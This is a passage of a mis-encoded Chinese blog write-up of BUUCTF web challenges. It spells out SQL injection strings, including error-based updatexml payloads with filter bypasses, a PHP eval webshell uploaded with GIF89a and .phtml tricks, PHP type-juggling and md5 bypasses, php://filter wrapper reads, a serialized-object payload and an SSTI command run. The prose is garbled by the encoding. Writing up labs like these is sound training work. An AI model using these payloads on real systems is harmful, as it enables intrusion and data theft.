alt=""><br>æ‰€ä»¥çŒœæµ‹flagåœ¨æ ¹ç›®å½•ä¸‹ï¼ŒæŸ¥è¯¢åå‘ç°æœç„¶æœ‰flagã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giqkghkrxbj30cp08vjrg.jpg" alt=""><br>ä»è€Œè·å¾—flagã€‚</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giqlq6u9b5j31d40ic13y.jpg" alt=""><br>ç»è¿‡æµ‹è¯•å‘ç°æœ¬é¢˜éœ€è¦ä½¿ç”¨åŒå†™è¿›è¡Œç»•è¿‡ï¼Œå¹¶ä¸”from,union,selectè¿™äº›å‡½æ•°éƒ½è¢«æ›¿æ¢ä¸ºç©ºã€‚ä¾‹å¦‚ç”¨uniuniononï¼Œæ£€æµ‹æ—¶å…¶ä¸­çš„unionæ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥å˜æˆäº†unionï¼Œå› æ­¤èƒ½ç»•è¿‡æ£€æµ‹ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giqlshb7inj31470i4gve.jpg" alt=""><br>ä½¿ç”¨è”åˆæ³¨å…¥è¿›è¡Œæ³¨å…¥ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giqltzeyfej31260hrtif.jpg" alt=""><br>æŸ¥è¯¢æ•°æ®åº“åã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giqm338dbnj31g40kk145.jpg" alt=""><br>æŸ¥è¡¨åã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giqm46pu58j31fa0iu7fm.jpg" alt=""><br>æŸ¥åˆ—åã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giqm5a52iyj319p0j07f9.jpg" alt=""><br>æŸ¥å­—æ®µã€‚</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girdbmsqz3j30tb08x0zk.jpg" alt=""><br>å°è¯•ä¸Šä¼ å¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„jpgæ–‡ä»¶å‘ç°é¢˜ç›®è¿‡æ»¤äº†&lt;?ã€‚</p><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1girdh6orubj30st0620sw.jpg" alt=""></p><p>ä¿®æ”¹æœ¨é©¬ä¸ºï¼š<script language="php">eval($_POST['shell']);</script><br>æ˜¾ç¤ºæ–‡ä»¶ä¸æ˜¯å›¾ç‰‡ï¼Œæ‰€ä»¥åŠ ä¸ŠGIF89aç»•è¿‡å›¾ç‰‡æ£€æµ‹ã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1girdhhemukj30mw06y74b.jpg" alt=""></p><p>æˆåŠŸä¸Šä¼ æ–‡ä»¶<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1girdmbo2g3j30qa05oq3e.jpg" alt=""><br>ç„¶åæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€åä¸ºphpå‘ç°è¢«æ£€æµ‹åˆ°äº†ã€‚</p><p>æŸäº›æƒ…å†µä¸‹ç»•è¿‡åç¼€åæ£€æµ‹ï¼š</p><p>php,php3,php4,php5,phtml,pht</p><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1girdp5j5ibj30po07emxw.jpg" alt=""><br>é€ä¸ªæµ‹è¯•ï¼Œæœ€åå‘ç°ä½¿ç”¨phtmlå¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œä»è€ŒæˆåŠŸä¸Šä¼ æœ¨é©¬ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1girdqlg5c1j30ps04yglt.jpg" alt=""><br>è¿æ¥èšå‰‘ååœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagã€‚</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>ä»é¢˜ç›®å¯çŸ¥è¯¥é¢˜æ˜¯è¦æŸ¥æ‰¾å¤‡ä»½æ–‡ä»¶ï¼Œå°è¯•.bakå‘ç°å¤‡ä»½æ–‡ä»¶ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gire1el7lpj30ld0amdge.jpg" alt=""><br>å®¡è®¡ä»£ç å¯çŸ¥è¾“å…¥çš„keyåªèƒ½ä¸ºæ•°å­—è€Œä¸”keyè¦å’Œstrç›¸ç­‰æ‰èƒ½è·å¾—flag.</p><p>æœ¬é¢˜è€ƒæŸ¥PHPçš„å¼±ç±»å‹ç‰¹æ€§ï¼Œintå’Œstringæ˜¯æ— æ³•ç›´æ¥æ¯”è¾ƒçš„ï¼Œphpä¼šå°†stringè½¬æ¢æˆintç„¶åå†è¿›è¡Œæ¯”è¾ƒï¼Œè½¬æ¢æˆintæ¯”è¾ƒæ—¶åªä¿ç•™æ•°å­—ã€‚<br>æ‰€ä»¥åªéœ€è¦keyç­‰äº123å³å¯è·å¾—flagã€‚</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girm8rdlp3j30vz0bq75t.jpg" alt=""><br>ä¸Šä¼ æ–‡ä»¶çš„é¢˜ï¼Œäºæ˜¯ä¸Šä¼ å¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„jpgæ–‡ä»¶ç„¶åæŠ“åŒ…ä¿®æ”¹åç¼€ä¸º.phpå‘ç°è¢«æ£€æµ‹å‡ºæ¥äº†ï¼Œå°è¯•ä¹‹å‰çš„åˆ©ç”¨phtmlç»•è¿‡ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1girmaxa2qsj313g0aqmys.jpg" alt=""><br>æˆåŠŸä¸Šä¼ æ–‡ä»¶ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girmbw5y7yj30rh05ogm0.jpg" alt=""><br>èšå‰‘è¿æ¥ååœ¨æ ¹ç›®å½•æˆåŠŸè·å¾—flagã€‚</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p>æŸ¥çœ‹æºç å‘ç°pay.phpé¡µé¢ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girmtur0qsj30gw090t9g.jpg" alt=""><br>æŸ¥çœ‹pay.phpé¡µé¢çš„æºç å‘ç°å¦‚ä¸Šä»£ç ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1girmw99p9wj310e01pt8n.jpg" alt=""><br>æŠ“åŒ…åˆ†æå‘ç°éœ€è¦cuitâ€™så­¦ç”Ÿæ‰èƒ½è´­ä¹°ï¼Œè€Œä¸”user=0ï¼Œæ‰€ä»¥æƒ³åˆ°è¿™é‡Œçš„useræ˜¯åˆ¤æ–­æ˜¯ä¸æ˜¯cuitâ€™så­¦ç”Ÿï¼Œä¿®æ”¹user=1åè¯æ˜çŒœæƒ³ã€‚<br>ä¸‹ä¸€æ­¥ä¾¿æ˜¯å¦‚è®©password=404ï¼Œä½†æ˜¯passwordä¸èƒ½æ˜¯æ•°å­—ã€‚</p><p>è¿™é‡Œè€ƒæŸ¥<strong>phpä¸­çš„is_numeric()æ¼æ´</strong></p><p>is_numericå‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åã€‚æ‰€ä»¥ï¼ŒæŸ¥çœ‹å‡½æ•°å‘ç°è¯¥å‡½æ•°å¯¹å¯¹äºç¬¬ä¸€ä¸ªç©ºæ ¼å­—ç¬¦ä¼šè·³è¿‡ç©ºæ ¼å­—ç¬¦åˆ¤æ–­ï¼Œæ¥ç€åé¢çš„åˆ¤æ–­ï¼</p><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1girn38afobj314r03jmx8.jpg" alt=""><br>passwordæ­£ç¡®åä¾¿æ˜¯è¾“å…¥moneyï¼Œä½†æ˜¯moneyçš„å€¼æ˜¾ç¤ºé•¿åº¦å¤ªé•¿ã€‚</p><p>strcmpæ¼æ´</p><p>æ³¨ï¼šè¿™ä¸€ä¸ªæ¼æ´é€‚ç”¨ä¸5.3ä¹‹å‰ç‰ˆæœ¬çš„php</p><p>è¿™ä¸ªå‡½æ•°æ˜¯ç”¨äºæ¯”è¾ƒå­—ç¬¦ä¸²çš„å‡½æ•°</p><p>int strcmp ( string $str1 , string $str2 )</p><p>å‚æ•° str1ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚str2ç¬¬äºŒä¸ªå­—ç¬¦ä¸²ã€‚å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</p><p>å¯çŸ¥ï¼Œä¼ å…¥çš„æœŸæœ›ç±»å‹æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥éå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®çš„æ—¶å€™ï¼Œè¿™ä¸ªå‡½æ•°å°†ä¼šæœ‰æ€ä¹ˆæ ·çš„è¡Œä¸ºå‘¢ï¼Ÿå®é™…ä¸Šï¼Œå½“è¿™ä¸ªå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹ï¼Œè¿™ä¸ªå‡½æ•°å°†å‘ç”Ÿé”™è¯¯ï¼Œä½†æ˜¯åœ¨5.3ä¹‹å‰çš„phpä¸­ï¼Œæ˜¾ç¤ºäº†æŠ¥é”™çš„è­¦å‘Šä¿¡æ¯åï¼Œå°†return 0 ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1girn896mbtj30ya04h3ym.jpg" alt=""><br>æ‰€ä»¥é‡‡ç”¨æ•°ç»„ç»•è¿‡moneyè·å¾—flagã€‚</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1girof886dzj30on0d4ab6.jpg" alt=""><br>æ‰“å¼€é¢˜ç›®å³å¯çœ‹åˆ°æºç ã€‚</p><p>ç¬¬ä¸€ä¸ªéœ€è¦ç»•è¿‡çš„ç‚¹ï¼š</p><p>if(isset($text)&amp;&amp;(file_get_contents($text,â€™râ€™)===â€welcome to the zjctfâ€))</p><p>éœ€è¦æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶ä¸”æ–‡ä»¶å†…å®¹ä¸ºwelcome to the zjctfã€‚<br>æœ¬é¢˜æ²¡æœ‰ç¬¦åˆè¯¥å†…å®¹çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ä½¿ç”¨dataä¼ªåè®®ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giromvw3t1j30sx0bz0tr.jpg" alt=""><br>æ„é€ ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=ç»•è¿‡ç¬¬ä¸€ä¸ªæ£€æµ‹ã€‚</p><p>ç¬¬äºŒä¸ªéœ€è¦ç»•è¿‡çš„ç‚¹:<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girp05dtdkj30dv059q36.jpg" alt=""></p><p>æœ¬é¢˜ä¸èƒ½ç›´æ¥è¯»å–flagï¼Œæ‰€ä»¥éœ€è¦å…ˆè¯»å–useless.phpçš„å†…å®¹ï¼Œé’ˆå¯¹phpæ–‡ä»¶éœ€è¦è¿›è¡Œbase64ç¼–ç ï¼Œä¸ç„¶ä¸èƒ½è¯»åˆ°å†…å®¹ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giroxrba4aj30fb07vt8v.jpg" alt=""><br>æ„é€ ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/convert.base64-encode/resource=useless.phpè¯»å–åˆ°useless.phpçš„å†…å®¹ã€‚</p><p>ç¬¬ä¸‰ä¸ªéœ€è¦ç»•è¿‡çš„ç‚¹:</p><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giroqu3o0yj30bq0300so.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1girp620tycj30iz0gjab3.jpg" alt=""><br>æ‰€ä»¥æ„é€ passwordèƒ½å¤Ÿè¯»åˆ°flag.phpçš„å†…å®¹ã€‚<br>æœ€åçš„payload:<br>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:â€Flagâ€:1:{s:4:â€fileâ€;s:8:â€flag.phpâ€;}<br>æŸ¥çœ‹æºç è·å¾—flagã€‚</p><p>å‚è€ƒï¼š<br><a href="https://www.cnblogs.com/wangtanzhi/p/12184759.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12184759.html</a></p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1girsnt4zzrj31bl07r0u6.jpg" alt=""><br>åœ¨ç½‘ç»œä¸­çš„å“åº”å¤´ä¸­å‘ç°æœ¬é¢˜çš„æç¤º</p><p>select * from â€˜adminâ€™ where password=md5($pass,true)<br>æŸ¥çœ‹wpåçŸ¥é“æœ¬å…³ä½¿ç”¨ffifdyopæ¥ç»•è¿‡ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²md5åŠ å¯†åæ˜¯276f722736c95d99e921722cf9ed621cï¼Œç»è¿‡hexè§£å¯†åæ˜¯â€™orâ€™6\xc9]\x99\xe9!r,\xf9\xedb\x1cã€‚æ‹¼æ¥åå½¢å¼æ˜¯select * from â€˜adminâ€™ where password=â€™â€™ or â€˜6xxxxxâ€™æ„æˆä¸‡èƒ½å¯†ç ï¼Œä»è€Œç»•è¿‡md5å‡½æ•°ã€‚</p><p>è¾“å…¥ffifdyopåé¡µé¢å‘ç”Ÿå˜åŒ–ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1girt0gqvt9j30eq05vmxb.jpg" alt=""></p><p>åœ¨æºç ä¸­å‘ç°ä»¥ä¸Šå†…å®¹ã€‚</p><p>md5 bypass</p><p>md5()æˆ–è€…sha1()ä¹‹ç±»çš„å‡½æ•°è®¡ç®—çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼ï¼Œå¯¹äºæ•°ç»„åˆ™è¿”å›falseï¼Œå¦‚æœ$aå’Œ$béƒ½æ˜¯æ•°ç»„åˆ™åŒåŒè¿”å›FALSE, ä¸¤ä¸ªFALSEç›¸ç­‰å¾—ä»¥ç»•è¿‡ã€‚</p><p>è¿™é‡Œä¹Ÿå¯ä»¥æ‰¾å‡ºmd5éƒ½æ˜¯0eå¼€å¤´çš„ï¼Œ0eå¼€å¤´çš„md5çš„ç»“æœä¸º0.</p><p>QNKCDZOï¼Œ<br>s155964671aï¼Œ<br>s1091221200aç­‰éƒ½æ˜¯0eå¼€å¤´çš„ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1girt6lsxr0j30r3075glv.jpg" alt=""><br>é¡µé¢å†æ¬¡è·³è½¬åè·å¾—ä¸€æ®µä»£ç ã€‚<br>è¿™é‡Œä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼ŒåŸç†æ˜¯md5ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œå¯¼è‡´å‡½æ•°è¿”å›nullã€‚<br>ä»è€Œè·å¾—flagã€‚</p><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯æŠ¥é”™æ³¨å…¥ï¼Œæœ€åå¾—åˆ°çš„dataå‘ç°æ˜¯è‡ªå·±çš„æ³¨å†Œä¿¡æ¯ï¼Œäºæ˜¯ç™¾åº¦äº†ä¸€ä¸‹ï¼Œå‘ç°è¿™é¢˜æ˜¯æœ‰robots.txtæ–‡ä»¶ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giscnbbqznj30mc04x3yq.jpg" alt=""><br>å‘ç°é¢˜ç›®æœ‰å¤‡ä»½æ–‡ä»¶ï¼Œä¸‹è½½ä¹‹åæ‰“å¼€<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giscoldaawj30zh0ohmz1.jpg" alt=""><br>å¾—åˆ°é¢˜ç›®çš„ä»£ç ã€‚<br>å¯¹ä»£ç è¿›è¡Œå®¡è®¡ï¼Œå‘ç°æœ¬é¢˜è€ƒæŸ¥çš„æ˜¯ssrfã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gisf2jjfauj30sm0c9q4m.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gisflky5vzj314r0jsdhh.jpg" alt=""><br>ç»æŠ¥é”™æ³¨å…¥æŸ¥çœ‹dataä¸­çš„æ•°æ®å‘ç°æœ¬é¢˜åº”è¯¥è¦åˆ©ç”¨ååºåˆ—åŒ–çš„çŸ¥è¯†ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gisfp3cyf1j30jc0dm74x.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gisfsik39wj318k0kt75q.jpg" alt=""><br>æœ€ç»ˆçš„payloadå¦‚å›¾æ‰€ç¤ºï¼Œåˆ—åä¾æ¬¡ä¸ºno,username,passwd,dataï¼Œæ‰€ä»¥dataçš„å€¼åœ¨å››å·ä½ä¼ å…¥ã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gisfwss67oj310y027wek.jpg" alt=""><br>æœ€ååœ¨æºç ä¸­è·å¾—flagã€‚</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>å‘ç°åªæœ‰è¾“å…¥1å’Œ2è¿˜æœ‰1/1ç­‰æ‰ä¸ä¼šé”™è¯¯ï¼Œå°è¯•è®¸å¤šæ³¨å…¥çš„æ–¹å¼å‘ç°éƒ½ä¼šè¢«æ£€æµ‹å‡ºæ¥ï¼Œç™¾åº¦ä¹‹åå‘ç°æœ¬é¢˜éœ€è¦ç”¨äºŒåˆ†æ³•æ¥è·‘ã€‚<br>åœ¨ç½‘ä¸Šæ‰¾äº†å¾ˆå¤šä»£ç ï¼Œæ‰æ‰¾åˆ°ä¸€ä¸ªèƒ½æ­£ç¡®è·‘å‡ºflagçš„è„šæœ¬ï¼š<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gisgobetzjj30qr0jzab6.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gisgs87e18j30ex04emxe.jpg" alt=""><br>æˆåŠŸè·‘å‡ºflagã€‚<br>ä½†æ˜¯æµ‹è¯•å‘ç°è¯¥flagå°‘ä¸€ä¸ªæ•°ï¼Œæœ€ç»ˆflag:<br>flag{88beaa12-81a3-4445-bcee-8e89cf1d356c}</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_43900387/article/details/104838055" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43900387/article/details/104838055</a></p><h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p>æ‰“å¼€åä¾¿æç¤ºäº†ç½‘é¡µå¤‡ä»½æ–‡ä»¶ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gishlqb21gj30ml055wf0.jpg" alt=""><br>è§£å‹åå‘ç°å±…ç„¶æœ‰3002ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”æ¯ä¸ªæ–‡ä»¶å†…å®¹å¾ˆå¤šï¼Œè€Œä¸”è¿˜æœ‰å¾ˆå¤šshellï¼Œä½†ä¸æ˜¯æ¯ä¸ªshelléƒ½èƒ½ä½¿ç”¨ã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gisk2z2tv1j30l60kugnt.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gisk3bntwyj30ns0gwmyq.jpg" alt=""><br>ç™¾åº¦ä¸€ä¸‹ï¼Œä½¿ç”¨äº†ä¸€ä¸‹å¤§ä½¬çš„è„šæœ¬ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gisk4sslvdj30nr033jrg.jpg" alt=""><br>ç»è¿‡ä¸€æ®µæ—¶é—´æŠŠå¯ä»¥åˆ©ç”¨shellçš„phpæ–‡ä»¶è·‘å‡ºæ¥äº†ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gisk62t3blj31f90l2gp4.jpg" alt=""><br>äºæ˜¯æ„é€ payload:</p><p><a href="http://c572dc92-c543-4f1c-a48d-459dc705a5b3.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat" target="_blank" rel="noopener">http://c572dc92-c543-4f1c-a48d-459dc705a5b3.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat</a> /flag è·å¾—flagã€‚</p><p>å‚è€ƒï¼š<br><a href="https://www.freesion.com/article/9565243932/" target="_blank" rel="noopener">https://www.freesion.com/article/9565243932/</a></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gisuzqei6yj316c0it12s.jpg" alt=""><br>ç»è¿‡æµ‹è¯•å‘ç°æœ¬é¢˜è¦ä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼è¿›è¡Œæ³¨å…¥ã€‚è€Œä¸”æœ¬é¢˜è¿‡æ»¤äº†ç©ºæ ¼ï¼Œandè¿˜æœ‰=å·ï¼Œä½†orå¯ä»¥ä½¿ç”¨ï¼Œè€Œä¸”ç”¨æ‹¬å·å¯ä»¥ç»•è¿‡ç©ºæ ¼ï¼Œç”¨likeå¯ä»¥ç»•è¿‡=å·ã€‚<br>æ„é€ payload:username=adminâ€™or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=123<br>æŸ¥åˆ°æ•°æ®åº“ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gisv7mfj0ij310b0jpaje.jpg" alt=""><br>username=adminâ€™or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(â€˜geekâ€™)),0x7e),1))%23&amp;password=123<br>è·å¾—è¡¨åH4rDsq1ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gisv9g5qv3j312n0i1gv3.jpg" alt=""><br>username=adminâ€™or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(â€˜H4rDsq1â€™)),0x7e),1))%23&amp;password=123<br>è·å¾—åˆ—åã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gisvb1lo1mj31a60hagw4.jpg" alt=""><br>username=adminâ€™or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23&amp;password=123<br>è·å¾—flagã€‚è¿™æ ·åªèƒ½å¾—åˆ°flagçš„å·¦åŠæ®µï¼Œåœ¨passwordå‰é¢åŠ ä¸Šrightè·å¾—flagå³åŠæ®µã€‚</p><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gisvpx4iz6j30lk03fdfs.jpg" alt=""><br>éšä¾¿è¾“å…¥ä¸€ä¸ªæ•°å­—åï¼Œæ‰“å¼€æºç å‘ç°é¢˜ç›®æœ‰æç¤ºï¼Œæ ¹æ®æç¤ºå¯çŸ¥æœ¬é¢˜åº”è¯¥æ˜¯sstiæ¨¡æ¿æ³¨å…¥ã€‚<br>å°è¯•4è¾“å‡ºçš„ç»“æœæ˜¯4ï¼Œè¯æ˜ç¡®å®æ˜¯æ¨¡æ¿æ³¨å…¥ã€‚<br>å‚è€ƒåˆ«äººçš„wpï¼Œæ‰¾åˆ°äº†ä¸€æ¡å¯ä»¥æ‰§è¡Œçš„payload:<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giswcnupuqj317i021glj.jpg" alt=""><br>æ‰§è¡Œå‘½ä»¤lsæ‰¾åˆ°flagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œæ‰§è¡Œcat /flagè·å¾—flagã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/ChenZIDu/article/details/105159197" target="_blank" rel="noopener">https://blog.csdn.net/ChenZIDu/article/details/105159197</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener" title="CTF SSTI(æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥)">https://www.cnblogs.com/20175211lyz/p/11425368.html</a></p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gitotlofy5j30ss0533yo.jpg" alt=""><br>æ‰“å¼€é¢˜ç›®æŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€æ®µbase32ç¼–ç ï¼Œè§£å¯†åå¾—åˆ°base64ç¼–ç ï¼šc2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==å†è§£ç å¾—åˆ°ä¸€æ®µæç¤ºä¿¡æ¯ï¼šselect * from user where username = â€˜$nameâ€™ã€‚è¯´æ˜usernameå¤„å­˜åœ¨æ³¨å…¥ç‚¹ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gitpfhwsfwj30y50b3gn1.jpg" alt=""><br>æŠ“åŒ…è¿›è¡Œåˆ†æï¼Œæœ¬é¢˜å°†orè¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨å¤§å†™ç»•è¿‡ï¼Œæµ‹è¯•åå‘ç°æœ‰3ä¸ªå­—æ®µã€‚<br>ç™¾åº¦äº†ä¸‹ï¼ŒçŸ¥é“äº†ä¸€ç‚¹è”åˆæ³¨å…¥çš„çŸ¥è¯†ç‚¹ï¼Œå½“è”åˆæŸ¥è¯¢ä¸å­˜åœ¨æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ã€‚è¿˜çŸ¥é“æœ¬é¢˜å¯†ç æ˜¯ç”¨md5åŠ å¯†çš„ã€‚<br>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°äºŒå·ä½æ˜¯usernameï¼Œä¸‰å·ä½æ˜¯passwordã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gitpossrioj30sb05pq3i.jpg" alt="">â€˜æ„é€ ä¸€ä¸ªè™šå‡çš„èº«ä»½ä»è€Œè·å¾—flagã€‚</p><h2 